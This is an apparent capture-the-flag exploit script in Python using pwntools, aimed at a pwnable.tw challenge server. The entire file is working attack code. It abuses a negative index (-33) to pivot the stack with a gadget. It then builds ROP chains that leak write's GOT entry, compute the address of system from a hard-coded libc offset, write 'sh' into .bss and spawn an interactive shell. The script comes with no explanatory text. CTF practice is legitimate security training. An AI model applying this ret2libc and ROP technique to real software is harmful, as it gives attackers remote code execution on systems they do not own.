#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
# context.log_level = 'debug'
#r = remote('127.0.0.1', 1234)
r = remote('chall.pwnable.tw', 10202)

elf = ELF('/tmp/p/a')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

write_plt = elf.plt['write']
puts_plt = elf.plt['puts']
open_plt = elf.plt['open']
read_plt = elf.plt['read']
read_got = elf.got['read']
main = elf.symbols['main']
add_esp_1c = 0x08048e48
pop3_ret = 0x080494da
pop2_ret = 0x080498a9
write_got = elf.got['write']
write_off = libc.symbols['write']
system_off = libc.symbols['system']

def set_name(name):
	r.sendlineafter('> ', str(6))
	r.sendlineafter('> ', str(2))
	r.sendlineafter('Enter your name: ', name)
	r.sendlineafter('> ', str(1))

def leak(addr):
	set_name(p32(add_esp_1c))
	pad = flat([write_plt, pop3_ret, 1, addr, 0x80, main])
	r.sendafter('> ', '-33'.ljust(8,'a') + pad)
	d = r.recv(0x80)
	print "get: ",repr(d)
	print "test: ", hex(u32(d[:4]))
	r.recvrepeat(0.3)
	return u32(d[:4])
bss = 0x80550c0
system = leak(write_got) - 633936

set_name(p32(add_esp_1c)+cyclic(0x20))
payload = flat([read_plt, pop3_ret, 0, bss, 32, system, bss, bss])
r.sendafter("> ", "-33aaaaa" + payload)
r.send('sh\x00')
#leak(write_got)
r.interactive()


"""
633936
"""


"""
base = leak(write_got) - write_off
print "base: ",hex(base)
system = system_off + base

set_name(p32(add_esp_1c)+cyclic(0x20))
payload = flat([read_plt, pop3_ret, 0, bss, 32, system, bss, bss])
r.sendafter("> ", "-33aaaaa" + payload)
r.send('sh\x00')
#leak(write_got)
r.interactive()

"""